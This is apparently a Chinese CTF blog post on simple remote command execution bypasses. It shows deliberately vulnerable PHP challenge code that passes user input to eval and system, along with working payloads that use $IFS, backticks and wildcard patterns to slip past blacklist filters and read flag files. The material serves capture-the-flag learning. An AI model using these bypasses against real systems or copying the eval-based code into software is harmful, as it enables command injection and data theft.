---
title: "简单的RCE"
subtitle: ""

description: ""

date: 2024-03-04T15:08:47+08:00
draft: false

tags: ["RCE"]
categories: ["Bypass"]

---

## 闲话

原本是打算把所有的RCE姿势写在一篇发出来的，没能想到这里面的水这么深，被迫分篇记录

这一篇就写点简单的RCE吧

## 常见命令的替代

```
ls —— dir
cat —— tac、head、more、less、tail
```

## 分割命令

经常会碰见将各种命令列入黑名单的题，但若正则表达式过于普通，就可以直接分割命令来进行绕过

可用`\`、`''`来讲分割

## 空格绕过

常常会遇见空格被过滤的情况，可以用以下语句绕过

```
$IFS
${IFS}
$IFS$9
<>
```

另外还有很多，实战时这几种就够用，要根据不同的情况使用不同的语句来绕过

## 反引号执行

在某些题目中，往往只给我们`eval()`函数，若此时system一类的执行命令的函数也被限制

就可以用php中反引号可以执行命令的特性来实现命令执行

举个复杂点的栗子（也没复杂到哪去）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];
$code = str_replace("(","括号",$code);
$code = str_replace(".","点",$code);
eval($code); 
?>
```

本题中过滤了`(`与`.`

由于用反引号执行并不会有回显，所以我们需要`echo`、`printf`、`var_dump`这类语句或函数来输出命令执行的结果

payload

```
code=echo `cat /f*`;
```

## 通配符绕过

我目前遇见的通配符绕过只有两种

`?`：用于匹配单个字符

`[]`：用于匹配一个字符范围

栗题1：

```php
<?php   
error_reporting(0);  
highlight_file(__FILE__);  

if (isset($_POST['ctf_show'])) {    
    $ctfshow = $_POST['ctf_show'];  
    if (!preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/",$ctfshow)){
        system($ctfshow);  
    }
    else{  
        echo("????????");  
    }  
}  
?>
```

题目告诉我们可以用`/getflag`直接获取flag，仔细查看正则便能发现字符`a`被放出来了

这时就能用`?`来匹配其他字母

payload

```
ctf_show=/?????a?
```

栗题2：

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$shell = $_POST['shell'];
$cmd = $_GET['cmd'];
if(preg_match('/f|l|a|g|\*|\?/i',$cmd)){
    die("Hacker!!!!!!!!");
}
eval($shell($cmd)); 
```

可以看到四个字母都被过滤，但其他字母与`[]`被放了出来，这时就能用`[]`来匹配所需字母的范围

payload

```
?cmd=more /[e-g][k-m][0-b][e-h]

shell=system
```